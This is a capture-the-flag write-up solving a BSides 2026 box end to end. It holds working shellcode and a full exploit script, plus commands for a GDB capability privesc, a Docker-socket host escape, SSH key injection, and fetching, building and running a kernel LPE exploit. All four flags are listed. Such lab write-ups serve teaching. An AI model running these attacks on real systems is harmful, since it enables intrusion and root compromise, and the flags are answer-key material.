---
title: "BSides 2026 BOF CTF - Full Solve"
type: technique
tags: [ctf, bof, rop, jmp-rsp, shellcode, cap-privesc, docker-escape, solve, writeup]
phase: exploitation
date_created: 2026-05-09
date_updated: 2026-05-22
sources: [ctf-bsides-buffer-2026-solve]
---

# BSides 2026 BOF CTF - Full Solve

**Target:** `<IP>:8443`
**Given:** `adminpanel` binary
**Goal:** 4-flag chain — `bof.txt` → `docker.txt` → `user.txt` → `root_flag` (binary)

---

## Flag Chain

| Flag         | Location                        | How                                  | Pts |
| ------------ | ------------------------------- | ------------------------------------ | --- |
| `bof.txt`    | `/home/ctf/bof.txt`             | BOF shell as `ctf`                   | 150 |
| `docker.txt` | `/root/docker.txt`              | `cap_setuid` abuse → container root  | 100 |
| `user.txt`   | host `/home/ubuntu/user.txt`    | Docker socket escape                 | 150 |
| `root_flag`  | host `/root/root_flag` (binary) | Docker socket escape + dirtyfrag LPE | 100 |

---

## Phase 1: Recon

### Naive scan (triggers 20s ban)

```bash
nmap -T4 <IP>
# port 8443 filtered — IP banned for 20s
```

### Bypass: source port 53

```bash
nmap -g 53 -sV -p 8443 <IP>
# 8443/tcp open  unknown
# banner: "=== Auth Gateway v1.3 ==="
```

Firewall allows TCP to 8443 only from source port 53. Required for all connections including the exploit.

---

## Phase 2: Binary Analysis

### Basic checks

```bash
file adminpanel
# ELF 64-bit LSB executable, x86-64, dynamically linked, stripped

checksec adminpanel
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled          ← shellcode on stack works
# PIE:      No PIE (0x400000)    ← gadget addresses are fixed
```

### Strings

```bash
strings adminpanel
# auth_token_validator_v2          ← decoy
# security_module_initialized      ← decoy
# validate_session_integrity       ← decoy
# admin_bypass_protection_enabled  ← decoy
# Authentication key:
# Access denied
# === Auth Gateway v1.3 ===
```

Single code path — no menu. Binary prints banner, asks for "Authentication key:", reads input, replies "Access denied". The read is the vulnerable call.

### Find jmp rsp gadget

```bash
objdump -d adminpanel | awk '/jmp.*\*%rsp/{gsub(":",""); print "0x"$1; exit}'
# 0x401210

# Alternative:
ROPgadget --binary adminpanel | grep "jmp rsp"
# 0x0000000000401210 : jmp rsp
```

Gadget at `0x0000000000401210` — fixed address, no PIE.

---

## Phase 3: Find RIP Offset

Run locally, wrap with socat:

```bash
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:./adminpanel &
```

```python
# offset_finder.py
from pwn import *
context.arch = 'amd64'

io = remote('127.0.0.1', 4444)
io.recvuntil(b'Authentication key: ')
io.send(cyclic(300))
io.close()
```

```bash
python3 offset_finder.py
gdb adminpanel core
(gdb) x/gx $rsp
# 0x...: 0x6161616161616168
(gdb) quit

python3 -c "from pwn import *; print(cyclic_find(0x6161616161616168))"
# 72
```

**RIP offset: 72 bytes**

---

## Phase 4: Bad Character Identification

```python
# badchar_test.py
from pwn import *
context.arch = 'amd64'
context.log_level = 'error'

io = process('./adminpanel')
io.recvuntil(b'Authentication key: ')
io.send(b'A' * 8 + bytes(range(0x01, 0x100)))
io.close()
```

Attach GDB, break after `read()` returns, inspect buffer:

```
(gdb) x/256bx <buf_addr>
```

| Sent | Received | Verdict |
|---|---|---|
| `\x0a` | absent | BAD |
| `\x0b` | absent | BAD |
| `\x0d` | absent | BAD |
| `\x20` | absent | BAD |

**Bad chars: `\x0a \x0b \x0d \x20`**

`\x00` passes cleanly — `read()` is not null-terminated.

---

## Phase 5: Shellcode

Binary runs under socat — `execve("/bin/sh")` inherits the socket as stdin/stdout. No reverse shell needed.

```python
from pwn import *
context.arch = 'amd64'
sc = asm(shellcraft.sh())
# verify clean
BAD = (0x0a, 0x0b, 0x0d, 0x20)
assert not any(b in sc for b in BAD), "bad char in shellcode"
```

Or with msfvenom:

```bash
msfvenom -p linux/x64/exec CMD=/bin/sh -b '\x0a\x0b\x0d\x20' -f python -v shellcode
```

---

## Phase 6 — 9: Full 4-Flag Exploit Chain

Verified from separate Kali VM against target on port 8443 (update TARGET in exploit.py before running).

```python
#!/usr/bin/env python3
"""Full 4-flag exploit chain — BSides 2026 BOF CTF."""
import socket, struct, time

TARGET  = '<IP>'       # target host
PORT    = 8443
SPORT   = 53           # source port required — run as root
OFFSET  = 72
JMP_RSP = 0x0000000000401210

# pwntools: asm(shellcraft.sh()) amd64 — no bad chars \x0a \x0b \x0d \x20
SHELLCODE = bytes.fromhex(
    '6a6848b82f62696e2f2f2f73504889e7'
    '68726901018134240101010131f6566a'
    '085e4801e6564889e631d26a3b580f05'
)

payload  = b'A' * OFFSET
payload += struct.pack('<Q', JMP_RSP)
payload += b'\x90' * 32
payload += SHELLCODE

def recv_until(s, marker, timeout=5):
    s.settimeout(timeout)
    buf = b''
    try:
        while marker not in buf:
            buf += s.recv(512)
    except socket.timeout:
        pass
    return buf

def send_cmd(s, cmd, wait=0.6):
    s.send((cmd + '\n').encode())
    time.sleep(wait)
    s.settimeout(2)
    out = b''
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk: break
            out += chunk
    except socket.timeout:
        pass
    return out.decode(errors='replace')

print('[*] Connecting sport=53 ...')
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', SPORT))
s.connect((TARGET, PORT))

banner = recv_until(s, b'Authentication key: ')
print(f'[+] Banner received')
s.send(payload)
time.sleep(0.3)

# Flag 1 — bof.txt (ctf user)
print('\n[*] FLAG 1: bof.txt')
print(send_cmd(s, 'id').strip())
print(send_cmd(s, 'cat /home/ctf/bof.txt').strip())

# Flag 2 — docker.txt (GDB cap_setuid privesc → container root)
print('\n[*] FLAG 2: docker.txt (GDB cap abuse)')
print(send_cmd(s, 'getcap /usr/bin/gdb', wait=0.5).strip())
gdb_cmd = (
    "gdb -nx "
    "-ex 'python import os; os.setuid(0); os.setgid(0)' "
    "-ex 'shell id' "
    "-ex 'shell cat /root/docker.txt' "
    "-ex quit"
)
print(send_cmd(s, gdb_cmd, wait=3).strip())

# Flag 3 — user.txt (docker socket escape)
print('\n[*] FLAG 3: user.txt (docker socket escape)')
escape_cmd = (
    "gdb -nx "
    "-ex 'python import os; os.setuid(0); os.setgid(0)' "
    "-ex 'shell docker -H unix:///var/run/docker.sock run --rm "
    "-v /:/host alpine sh -c "
    "\"cat /host/home/ubuntu/user.txt\"' "
    "-ex quit"
)
print(send_cmd(s, escape_cmd, wait=30).strip())

# Flag 4 — root_flag binary (dirtyfrag LPE — manual, see Phase 9)

s.close()
print('\n[+] Done.')
```

```bash
sudo python3 exploit.py
# [*] FLAG 1: bof.txt
# uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),124(dockersock)
# BSIDES{A1b2C3d4E5f6G7h8I9jK}
# [*] FLAG 2: docker.txt (GDB cap abuse)
# /usr/bin/gdb = cap_setgid,cap_setuid+ep
# uid=0(root) gid=0(root) groups=0(root),124(dockersock),1000(ctf)
# BSIDES{L9m8N7o6P5q4R3s2T1uV}
# [*] FLAG 3: user.txt (docker socket escape)
# BSIDES{Q1w2E3r4T5y6U7i8O9pA}
# [*] FLAG 4: root_flag binary (dirtyfrag LPE — manual)
#     → see Phase 9 for SSH key injection + dirtyfrag steps
```

---

## Phase 7: Flag 2 — Container Root (docker.txt)

After getting `ctf` shell, enumerate capabilities:

```bash
getcap -r / 2>/dev/null
# /usr/bin/gdb = cap_setuid,cap_setgid+ep
```

GDB is installed with `cap_setuid,cap_setgid+ep`. Use its Python bridge to escalate:

```bash
gdb -nx \
  -ex 'python import os; os.setuid(0); os.setgid(0)' \
  -ex 'shell /bin/bash -p' \
  -ex quit
# id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/docker.txt
# BSIDES{L9m8N7o6P5q4R3s2T1uV}  ← flag 2
```

---

## Phase 8: Flag 3 — Docker Socket Escape (user.txt)

From container root shell, Docker socket is mounted:

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root dockersock /var/run/docker.sock

# Escape to host filesystem via alpine container
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine sh -c \
    'cat /host/home/ubuntu/user.txt'
# BSIDES{...}  ← flag 3
```

---

## Phase 9: Flag 4 — Dirtyfrag LPE (root_flag binary)

`/root/root_flag` is chmod 700 root-only and contains an XOR-encoded flag. It checks `/.dockerenv`
and cgroup — will print "unavailable" inside any container. Need genuine host root. Chain: inject
SSH key → ubuntu shell → dirtyfrag.

### Step 1: Inject SSH key via docker volume

`echo PUBKEY` fails through shell pipelines (spaces in the key comment break word splitting).
Base64-encode on attacker, decode inside alpine — no spaces, no quoting issues.

```bash
# Generate key pair on attacker machine
ssh-keygen -t ed25519 -f /tmp/ctf_key -N ''

# Base64-encode the pubkey (no spaces → safe to pass through shell)
B64=$(base64 -w0 /tmp/ctf_key.pub)

# From container root shell — inject via docker socket
docker -H unix:///var/run/docker.sock run --rm -v /:/host alpine sh -c "
  mkdir -p /host/home/ubuntu/.ssh &&
  echo ${B64} | base64 -d >> /host/home/ubuntu/.ssh/authorized_keys &&
  chmod 700 /host/home/ubuntu/.ssh &&
  chmod 600 /host/home/ubuntu/.ssh/authorized_keys &&
  chown -R 1000:1000 /host/home/ubuntu/.ssh &&
  echo KEY_INJECTED
"
```

### Step 2: SSH in as ubuntu → flag 3 confirmed

```bash
ssh -i /tmp/ctf_key ubuntu@<IP>
# ubuntu@target:~$ id
# uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
```

### Step 3: Dirtyfrag LPE

gcc is installed on the host. Player must find the exploit independently.

```bash
# On host as ubuntu:
git clone https://github.com/V4bel/dirtyfrag && cd dirtyfrag
gcc -O0 -Wall -o exp exp.c -lutil
./exp
# root@ubuntu:~# id
# uid=0(root) gid=0(root) groups=0(root)
/root/root_flag
# BSIDES{Z9x8C7v6B5n4M3k2J1hG}  ← flag 4
```

---

## Summary

```
[1]  nmap -g 53 -p 8443 <IP>                          → port discovered
[2]  checksec + objdump adminpanel                     → no canary, no NX, no PIE
[3]  gadget at 0x401210                                → jmp rsp confirmed
[4]  cyclic 300 → offset 72                            → RIP control
[5]  fuzz \x00–\xff → bad chars \x0a \x0b \x0d \x20   → shellcode encoded
[6]  sudo python3 exploit.py                           → ctf shell via socat execve
[7]  cat /home/ctf/bof.txt                             → flag 1
[8]  getcap -r / → gdb cap_setuid/cap_setgid → gdb -nx python bridge → container root
[9]  cat /root/docker.txt                              → flag 2
[10] docker run -v /:/host alpine                      → read user.txt
[11] cat /host/home/ubuntu/user.txt                    → flag 3
[12] inject SSH key via docker → ssh ubuntu@host       → ubuntu shell
[13] wget dirtyfrag/exp.c → gcc -O0 -o exp exp.c -lutil → ./exp → root
[14] /root/root_flag                                    → flag 4
```

---

## Troubleshooting

| Symptom | Cause |
|---|---|
| Port 8443 filtered even with `-g 53` | Container `--cap-add NET_ADMIN` missing |
| Payload lands, no shell | Bad char in shellcode — recheck `\x0a \x0b \x0d \x20` |
| `source_port=53` permission denied | Run exploit as root on attacker machine |
| `getcap` shows no caps on gdb | `setcap` failed during build — redeploy |
| Docker socket not found | Container not started with `-v /var/run/docker.sock:/var/run/docker.sock` |
| dirtyfrag compile fails | gcc not installed — `apt install gcc` on host |
| dirtyfrag crashes / no root | Kernel not vulnerable — check `uname -r` against CVE target range |
| SSH key injection silent, no access | Check `.ssh/` perms: 700 dir, 600 authorized_keys, owned by ubuntu (uid 1000) |


## Flags
```
Bof.txt:
BSIDES{A1b2C3d4E5f6G7h8I9jK}

Docker.txt:
BSIDES{L9m8N7o6P5q4R3s2T1uV}

User.txt:
BSIDES{Q1w2E3r4T5y6U7i8O9pA}

Root.txt:
BSIDES{Z9x8C7v6B5n4M3k2J1hG}
```

